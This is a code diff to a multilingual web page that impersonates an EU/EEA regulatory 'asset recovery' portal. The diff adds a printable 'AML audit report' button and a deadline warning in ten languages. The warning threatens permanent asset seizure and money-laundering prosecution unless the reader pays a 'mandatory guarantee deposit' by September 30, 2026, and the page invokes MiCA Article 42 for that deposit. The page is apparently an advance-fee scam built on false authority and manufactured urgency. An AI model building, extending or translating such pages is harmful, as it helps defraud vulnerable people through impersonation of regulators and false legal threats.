@@ -35,6 +35,8 @@ label { display: block; font-weight: 700; font-size: 14px; margin-bottom: 8px; }
 input[type="text"], input[type="email"], select { width: 100%; padding: 12px; border: 1px solid #8d959b; border-radius: 2px; font-size: 16px; box-sizing: border-box; }
 .btn-eu { background: var(--eu-blue); color: #fff; border: none; padding: 15px 30px; font-weight: 700; font-size: 16px; cursor: pointer; transition: 0.2s; display: inline-block; text-align: center; text-decoration: none; width: 100%; border-radius: 2px; }
 .btn-eu:hover { background: #002673; }
+.btn-outline { background: #ffffff; color: var(--eu-blue); border: 2px solid var(--eu-blue); margin-top: 12px; }
+.btn-outline:hover { background: #f0f4ff; }
 .phase { display: none; }
 .phase.active { display: block; }
 .status-header { background: #fdf7f7; border: 1px solid #ebccd1; padding: 25px; text-align: center; margin-bottom: 20px; }
@@ -52,6 +54,8 @@ input[type="text"], input[type="email"], select { width: 100%; padding: 12px; bo
 .aml-item i.fa-check-circle { color: var(--success); }
 .aml-item i.fa-times-circle { color: var(--danger); }
 
+.deadline-warning-box { background: #fdf2f2; border: 1px solid #f87171; border-left: 5px solid var(--danger); padding: 18px; font-size: 13px; color: #991b1b; margin: 20px 0 25px 0; border-radius: 2px; line-height: 1.6; }
+
 .guarantee-calc-box { background: #fff; border: 2px solid var(--eu-blue); padding: 30px; border-radius: 4px; margin: 20px 0; }
 .calc-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid var(--border); }
 .calc-total { font-size: 24px; font-weight: 700; color: var(--eu-blue); padding-top: 15px; }
@@ -68,6 +72,15 @@ input[type="text"], input[type="email"], select { width: 100%; padding: 12px; bo
 
 footer { background: var(--eu-blue); color: #fff; padding: 50px 10%; margin-top: 80px; font-size: 13px; text-align: center; }
 footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
+
+/* PRINT STYLES FOR PDF GENERATION */
+@media print {
+  .eu-top-banner, .btn-eu, .btn-outline, .lang-select, footer, #langSelect { display: none !important; }
+  body { background: #fff; color: #000; }
+  .card { border: none; box-shadow: none; padding: 0; }
+  .main-content { max-width: 100%; margin: 0; padding: 0; }
+  header { border-bottom: 2px solid var(--eu-blue); padding-bottom: 20px; }
+}
 </style>
 </head>
 <body onload="initPortal()">
@@ -148,6 +161,7 @@ footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
         <tr><td data-i18n="tblJurisdiction">Jurisdiction:</td><td><strong>EEA / Switzerland Hub</strong></td></tr>
       </table>
       <button class="btn-eu" style="background: var(--success);" onclick="openAgreement()" data-i18n="btnClaim">CLAIM RESTRAINED ASSETS</button>
+      <button class="btn-eu btn-outline" onclick="window.print()" data-i18n="btnPrint"><i class="fas fa-file-pdf"></i> DOWNLOAD / PRINT AUDIT REPORT (PDF)</button>
     </div>
 
     <!-- PHASE 4: LOADING -->
@@ -171,7 +185,17 @@ footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
         <div class="aml-item"><i class="fas fa-check-circle"></i> <span><strong data-i18n="aml6Title">Enhanced Due Diligence (EDD)</strong> — <span data-i18n="aml6Desc">Satisfied for AML classification</span></span></div>
         <div class="aml-item"><i class="fas fa-times-circle"></i> <span><strong data-i18n="aml7Title">Guarantee Deposit</strong> — <span style="color:var(--danger); font-weight:700;" data-i18n="aml7Desc">REQUIRED FOR CERTIFICATE ISSUANCE</span></span></div>
       </div>
+
+      <!-- DEADLINE WARNING BOX -->
+      <div class="deadline-warning-box">
+        <strong style="font-size: 14px;"><i class="fas fa-exclamation-triangle"></i> <span data-i18n="p5WarningTitle">STATUTORY COMPLIANCE DEADLINE NOTICE</span></strong><br>
+        <span data-i18n="p5WarningBody">
+          Pursuant to European Anti-Money Laundering (AML) Regulations, the beneficiary has until <strong>September 30th, 2026 at 23:59 CET</strong> to settle the mandatory guarantee deposit. Failure to complete verification within this statutory period will result in immediate permanent asset seizure, and the file may be referred to the relevant judicial court for formal Money Laundering proceedings.
+        </span>
+      </div>
+
       <button class="btn-eu" onclick="toCalculation()" data-i18n="btnCalc">PROCEED TO DEPOSIT CALCULATION</button>
+      <button class="btn-eu btn-outline" onclick="window.print()" data-i18n="btnPrint"><i class="fas fa-file-pdf"></i> DOWNLOAD / PRINT AUDIT REPORT (PDF)</button>
     </div>
 
     <!-- PHASE 6: CALCULATION -->
@@ -329,6 +353,7 @@ const i18n = {
     tblAuth: "Regulatory Authority:",
     tblJurisdiction: "Jurisdiction:",
     btnClaim: "CLAIM RESTRAINED ASSETS",
+    btnPrint: "DOWNLOAD / PRINT AUDIT REPORT (PDF)",
     p4Title: "Verifying Compliance Status",
     p4Wait: "Please wait...",
     p5Title: "AML Compliance Audit Report",
@@ -339,6 +364,8 @@ const i18n = {
     aml5Title: "Risk Screening", aml5Desc: "No sanctions, fraud, or prohibited activity detected",
     aml6Title: "Enhanced Due Diligence (EDD)", aml6Desc: "Satisfied for AML classification",
     aml7Title: "Guarantee Deposit", aml7Desc: "REQUIRED FOR CERTIFICATE ISSUANCE",
+    p5WarningTitle: "STATUTORY COMPLIANCE DEADLINE NOTICE",
+    p5WarningBody: "Pursuant to European Anti-Money Laundering (AML) Regulations, the beneficiary has until <strong>September 30th, 2026 at 23:59 CET</strong> to settle the mandatory guarantee deposit. Failure to complete verification within this statutory period will result in immediate permanent asset seizure, and the file may be referred to the relevant judicial court for formal Money Laundering proceedings.",
     btnCalc: "PROCEED TO DEPOSIT CALCULATION",
     p6Title: "Mandatory Guarantee Deposit Calculation",
     p6Text: "Pursuant to MiCA Article 42, a refundable guarantee deposit is required to secure the AML Clearance Certificate for high-value restrained assets.",
@@ -396,6 +423,7 @@ const i18n = {
     tblAuth: "Tilsynsmyndighed:",
     tblJurisdiction: "Jurisdiktion:",
     btnClaim: "ANMOD OM TILBAGEHOLDTE AKTIVER",
+    btnPrint: "DOWNLOAD / UDSKRIV REVISIONSRAPPORT (PDF)",
     p4Title: "Verificerer Overholdelsesstatus",
     p4Wait: "Vent venligst...",
     p5Title: "AML Overholdelses-Revisionsrapport",
@@ -406,6 +434,8 @@ const i18n = {
     aml5Title: "Risikoscreening", aml5Desc: "Ingen sanktioner, svig eller forbudte aktiviteter fundet",
     aml6Title: "Skærpet Kundekendskab (EDD)", aml6Desc: "Opfyldt for AML-klassificering",
     aml7Title: "GarantidePOSITUM", aml7Desc: "PÅKRÆVET FOR UDSTEDELSE AF CERTIFIKAT",
+    p5WarningTitle: "LOVMÆSSIG FRISTMEDDELELSE",
+    p5WarningBody: "I henhold til europæiske regler om bekæmpelse af hvidvaskning af penge (AML) har begunstigede indtil <strong>30. september 2026 kl. 23:59 CET</strong> til at indbetale det obligatoriske garantidepositum. Manglende verifikation inden for denne lovbestemte periode vil medføre øjeblikkelig permanent beslaglæggelse af aktiver, og sagen kan blive indbragt for den relevante domstol for hvidvaskning.",
     btnCalc: "FORTSÆT TIL DEPOSITUMBEREGNING",
     p6Title: "Obligatorisk Garantidepositum Beregning",
     p6Text: "I henhold til MiCA artikel 42 kræves et refunderbart garantidepositum for at sikre AML-godkendelsescertifikatet for tilbageholdte aktiver af høj værdi.",
@@ -463,6 +493,7 @@ const i18n = {
     tblAuth: "Aufsichtsbehörde:",
     tblJurisdiction: "Jurisdiktion:",
     btnClaim: "ZURÜCKBEHALTENE VERMÖGENSWERTE ANFORDERN",
+    btnPrint: "AUDITBERICHT HERUNTERLADEN / DRUCKEN (PDF)",
     p4Title: "Compliance-Status wird überprüft",
     p4Wait: "Bitte warten...",
     p5Title: "AML-Compliance-Audit-Bericht",
@@ -473,6 +504,8 @@ const i18n = {
     aml5Title: "Risicoscreening", aml5Desc: "Keine Sanktionen, Betrug oder verbotene Aktivitäten festgestellt",
     aml6Title: "Verstärkte Sorgfaltspflicht (EDD)", aml6Desc: "Für AML-Klassifizierung erfüllt",
     aml7Title: "Garantieeinzahlung", aml7Desc: "ERFORDERLICH FÜR DIE ZERTIFIKATSAUSSTELLUNG",
+    p5WarningTitle: "GESETZLICHER FRISTVERMERK",
+    p5WarningBody: "Gemäß den europäischen Anti-Geldwäsche-Bestimmungen (AML) hat der Begünstigte bis zum <strong>30. September 2026 um 23:59 Uhr MESZ</strong> Zeit, die obligatorische Garantiekaution zu hinterlegen. Wenn die Verifizierung nicht innerhalb dieser gesetzlichen Frist erfolgt, führt dies zur sofortigen dauerhaften Beschlagnahme der Vermögenswerte, und der Vorgang kann an das zuständige Gericht für ein förmliches Geldwäscheverfahren übergeben werden.",
     btnCalc: "WEITER ZUR KAUTIONSBERECHNUNG",
     p6Title: "Obligatorische Berechnungs-Garantiekaution",
     p6Text: "Gemäß MiCA Artikel 42 ist eine rückzahlbare Garantiekaution erforderlich, um das AML-Freigabezertifikat für hochwertige zurückbehaltene Vermögenswerte zu sichern.",
@@ -530,6 +563,7 @@ const i18n = {
     tblAuth: "Toezichthoudende Autoriteit:",
     tblJurisdiction: "Jurisdictie:",
     btnClaim: "INPANDIGE ACTIVA OPVRAGEN",
+    btnPrint: "AUDITRAPPORT DOWNLOADEN / AFDRUKKEN (PDF)",
     p4Title: "Nalevingsstatus Controleren",
     p4Wait: "Even geduld a.u.b...",
     p5Title: "AML-Nalevingsauditrapport",
@@ -540,6 +574,8 @@ const i18n = {
     aml5Title: "Risicoscreening", aml5Desc: "Geen sancties, fraude of verboden activiteiten gedetecteerd",
     aml6Title: "Verhoogd Cliëntenonderzoek (EDD)", aml6Desc: "Voldaan voor AML-classificatie",
     aml7Title: "Garantieborgsom", aml7Desc: "VEREIST VOOR AFGIFTE CERTIFICAAT",
+    p5WarningTitle: "WETTELIJKE TERMIJNKENNISGEVING",
+    p5WarningBody: "In overeenstemming met de Europese Anti-Witwasregelgeving (AML) heeft de begunstigde tot <strong>30 september 2026 om 23:59 MEST</strong> om de verplichte garantieborg te voldoen. Het niet voltooien van de verificatie binnen deze wettelijke termijn zal leiden tot onmiddellijke permanente inbeslagname van de activa, en het dossier kan worden overgedragen aan de bevoegde rechtbank voor een formele witwasprocedure.",
     btnCalc: "GA NAAR BORG-BEREKENING",
     p6Title: "Verplichte Garantieborg Berekening",
     p6Text: "In overeenstemming met MiCA Artikel 42 is een terugbetaalbare garantieborg vereist om het AML-klaarstellingscertificaat voor waardevolle ingehouden activa te verkrijgen.",
@@ -597,6 +633,7 @@ const i18n = {
     tblAuth: "Autoridad Reguladora:",
     tblJurisdiction: "Jurisdicción:",
     btnClaim: "RECLAMAR ACTIVOS RETENIDOS",
+    btnPrint: "DESCARGAR / IMPRIMIR INFORME DE AUDITORÍA (PDF)",
     p4Title: "Verificando Estado de Cumplimiento",
     p4Wait: "Por favor espere...",
     p5Title: "Informe de Auditoría de Cumplimiento AML",
@@ -607,6 +644,8 @@ const i18n = {
     aml5Title: "Evaluación de Riesgos", aml5Desc: "No se detectaron sanciones, fraude o actividades prohibidas",
     aml6Title: "Diligencia Debida Mejorada (EDD)", aml6Desc: "Satisfecho para la clasificación AML",
     aml7Title: "Depósito de Garantía", aml7Desc: "REQUERIDO PARA LA EMISIÓN DEL CERTIFICADO",
+    p5WarningTitle: "AVISO DE PLAZO LEGAL DE CUMPLIMIENTO",
+    p5WarningBody: "De conformidad con las regulaciones europeas contra el blanqueo de capitales (AML), el beneficiario tiene hasta el <strong>30 de septiembre de 2026 a las 23:59 CET</strong> para liquidar el depósito de garantía obligatorio. El incumplimiento de la verificación dentro de este plazo legal dará lugar a la incautación permanente e inmediata de los activos, y el expediente podrá remitirse al tribunal judicial competente para un procedimiento formal por blanqueo de dinero.",
     btnCalc: "PROCEDER AL CÁLCULO DEL DEPÓSITO",
     p6Title: "Cálculo Obligatorio del Depósito de Garantía",
     p6Text: "De conformidad con el Artículo 42 de MiCA, se requiere un depósito de garantía reembolsable para asegurar el Certificado de Autorización AML para activos retenidos de gran valor.",
@@ -664,6 +703,7 @@ const i18n = {
     tblAuth: "Sääntelyviranomainen:",
     tblJurisdiction: "Toimivalta-alue:",
     btnClaim: "VAADI PIDÄTETTYJÄ VAROJA",
+    btnPrint: "LATAA / TULOSTA TARKASTUSRAPORTTI (PDF)",
     p4Title: "Tarkistetaan Noudattamisen Tilaa",
     p4Wait: "Ole hyvä ja odota...",
     p5Title: "AML-Noudattamisen Auditointiraportti",
@@ -674,6 +714,8 @@ const i18n = {
     aml5Title: "Riskiseulonta", aml5Desc: "Ei pakotteita, petoksia tai kiellettyä toimintaa havaittu",
     aml6Title: "Tehostettu Asiakkaan Tunteminen (EDD)", aml6Desc: "Täytetty AML-luokitusta varten",
     aml7Title: "Takuutalletus", aml7Desc: "VAADITAAN TODISTUKSEN MYÖNTÄMISTÄ VARTEN",
+    p5WarningTitle: "LAKISÄÄTEINEN NOUDATTAMISEN MÄÄRÄAIKAPLUS",
+    p5WarningBody: "Euroopan rahanpesun vastaisen sääntelyn (AML) mukaisesti edunsaajalla on <strong>30. syyskuuta 2026 klo 23:59 CET</strong> asti aikaa suorittaa pakollinen takuutalletus. Jos vahvistusta ei suoriteta tämän lakisääteisen määräajan kuluessa, varat takavarikoidaan välittömästi ja lopullisesti, ja asia voidaan siirtää asianmukaiseen tuomioistuimeen virallista rahanpesuoikeudenkäyntiä varten.",
     btnCalc: "SIIRRY TALLETUSLASKENTAAN",
     p6Title: "Pakollisen Takuutalletuksen Laskenta",
     p6Text: "MiCA-asetuksen 42 artiklan mukaisesti palautettava takuutalletus vaaditaan AML-selvitystodistuksen saamiseksi arvokkaille pidätetyille varoille.",
@@ -731,6 +773,7 @@ const i18n = {
     tblAuth: "Autorité de Régulation:",
     tblJurisdiction: "Juridiction:",
     btnClaim: "RÉCLAMER LES ACTIFS RETENUS",
+    btnPrint: "TÉLÉCHARGER / IMPRIMER LE RAPPORT D'AUDIT (PDF)",
     p4Title: "Vérification du statut de conformité",
     p4Wait: "Veuillez patienter...",
     p5Title: "Rapport d'audit de conformité LCB/FT",
@@ -741,6 +784,8 @@ const i18n = {
     aml5Title: "Filtrage des Risques", aml5Desc: "Aucune sanction, fraude ou activité interdite détectée",
     aml6Title: "Vigilance Renforcée (EDD)", aml6Desc: "Satisfait pour la classification LCB/FT",
     aml7Title: "Dépôt de Garantie", aml7Desc: "REQUIS POUR LA DÉLIVRANCE DU CERTIFICAT",
+    p5WarningTitle: "AVIS DE DÉLAI LÉGAL DE CONFORMITÉ",
+    p5WarningBody: "Conformément à la réglementation européenne relative à la lutte contre le blanchiment d'argent (AML), le bénéficiaire a jusqu'au <strong>30 septembre 2026 à 23h59 CET</strong> pour régler le dépôt de garantie obligatoire. Le défaut de vérification dans ce délai légal entraînera la saisie définitive et immédiate des actifs, et le dossier pourra être transmis au tribunal judiciaire compétent pour une procédure formelle de blanchiment d'argent.",
     btnCalc: "PASSER AU CALCUL DU DÉPÔT",
     p6Title: "Calcul Obligatoire du Dépôt de Garantie",
     p6Text: "Conformément à l'article 42 de MiCA, un dépôt de garantie remboursable est requis pour obtenir le certificat de conformité AML pour les actifs retenus de grande valeur.",
@@ -798,6 +843,7 @@ const i18n = {
     tblAuth: "Autorità di Regolamentazione:",
     tblJurisdiction: "Giurisdizione:",
     btnClaim: "RICHIEDI ATTIVITÀ TRATTENUTE",
+    btnPrint: "SCARICA / STAMPA RAPPORTO DI AUDIT (PDF)",
     p4Title: "Verifica dello Stato di Conformità",
     p4Wait: "Attendere prego...",
     p5Title: "Rapporto di Audit di Conformità AML",
@@ -808,6 +854,8 @@ const i18n = {
     aml5Title: "Controllo dei Rischi", aml5Desc: "Nessuna sanzione, frode o attività proibita rilevata",
     aml6Title: "Adeguata Verifica Rafforzata (EDD)", aml6Desc: "Soddisfatta per la classificazione AML",
     aml7Title: "Deposito di Garanzia", aml7Desc: "RICHIESTO PER IL RILASCIO DEL CERTIFICATO",
+    p5WarningTitle: "AVVISO TERMINI LEGALI DI CONFORMITÀ",
+    p5WarningBody: "Ai sensi delle normative europee antiriciclaggio (AML), il beneficiario ha tempo fino al <strong>30 settembre 2026 alle 23:59 CET</strong> per saldare il deposito di garanzia obbligatorio. La mancata verifica entro questo termine di legge comporterà il sequestro permanente e immediato dei beni, e il fascicolo potrà essere trasmesso al tribunale competente per un procedimento formale di riciclaggio di denaro.",
     btnCalc: "PROCEDI AL CALCOLO DEL DEPOSITO",
     p6Title: "Calcolo Obbligatorio del Deposito di Garanzia",
     p6Text: "Ai sensi dell'Articolo 42 di MiCA, è richiesto un deposito di garanzia rimborsabile per ottenere il certificato di svincolo AML per attività trattenute di alto valore.",
@@ -865,6 +913,7 @@ const i18n = {
     tblAuth: "Tilsynsmyndighet:",
     tblJurisdiction: "Jurisdiksjon:",
     btnClaim: "KREV TILBAKEHOLDTE AKTIVER",
+    btnPrint: "LAST NED / SKRIV UT REVISJONSRAPPORT (PDF)",
     p4Title: "Verifiserer Etterlevelsesstatus",
     p4Wait: "Vennligst vent...",
     p5Title: "AML Etterlevelses-Revisjonsrapport",
@@ -875,6 +924,8 @@ const i18n = {
     aml5Title: "Risikoscreening", aml5Desc: "Ingen sanksjoner, svindel eller forbudt aktivitet avdekket",
     aml6Title: "Skjerpet Kundekontroll (EDD)", aml6Desc: "Oppfylt for AML-klassifisering",
     aml7Title: "GarantidePOSITUM", aml7Desc: "PÅKREVD FOR UTSTEDELSE AV SERTIFIKAT",
+    p5WarningTitle: "LOVBESTEMT ETTERLEVELSESFRIST",
+    p5WarningBody: "I henhold til europeiske regler om bekjempelse av hvitvasking av penger (AML) har mottakeren frist til <strong>30. september 2026 kl. 23:59 CET</strong> med å betale det obligatoriske garantidepositumet. Unnlatelse av å fullføre verifiseringen innen denne lovbestemte fristen vil føre til umiddelbar permanent beslagleggelse av aktiva, og saken kan bli oversendt til relevant domstol for formell hvitvaskingssak.",
     btnCalc: "GÅ TIL DEPOSITUMSBEREGNING",
     p6Title: "Obligatorisk Garantidepositum Beregning",
     p6Text: "I henhold til MiCA artikkel 42 kreves et refunderbart garantidepositum for å sikre AML-klareringssertifikatet for tilbakeholdte verdier av høy verdi.",
@@ -932,6 +983,7 @@ const i18n = {
     tblAuth: "Tillsynsmyndighet:",
     tblJurisdiction: "Jurisdiktion:",
     btnClaim: "BEGÄR INNEHÅLLNA TILLGÅNGAR",
+    btnPrint: "LADDA NER / SKRIV UT REVISIONSRAPPORT (PDF)",
     p4Title: "Verifierar Efterlevnadsstatus",
     p4Wait: "Vänligen vänta...",
     p5Title: "AML Revisionsrapport för Efterlevnad",
@@ -942,6 +994,8 @@ const i18n = {
     aml5Title: "Riskgranskning", aml5Desc: "Inga sanktioner, bedrägerier eller förbjuden aktivitet upptäcktes",
     aml6Title: "Skärpt Kundkännedom (EDD)", aml6Desc: "Uppfyllt för AML-klassificering",
     aml7Title: "GarantidePOSITUM", aml7Desc: "KRÄVS FÖR UTFÄRDANDE AV CERTIFIKAT",
+    p5WarningTitle: "LAGSTADGAD FRISTMEDDELANDE",
+    p5WarningBody: "I enlighet med europeiska bestämmelser om bekämpning av penningtvätt (AML) har mottagaren fram till <strong>30 september 2026 kl. 23:59 CET</strong> på sig att betala det obligatoriska garantidepositumet. Om verifieringen inte slutförs inom denna lagstadgade frist kommer det att leda till omedelbart permanent beslag av tillgångarna, och ärendet kan överlämnas till behörig domstol för formellt penningtvättsförfarande.",
     btnCalc: "GÅ TILL DEPOSITUMSBERÄKNING",
     p6Title: "Obligatorisk Garantidepositum Beräkning",
     p6Text: "Enligt MiCA artikel 42 krävs ett återbetalningsbart garantidepositum för att säkra AML-godkännandecertifikatet för innehållna tillgångar av högt värde.",
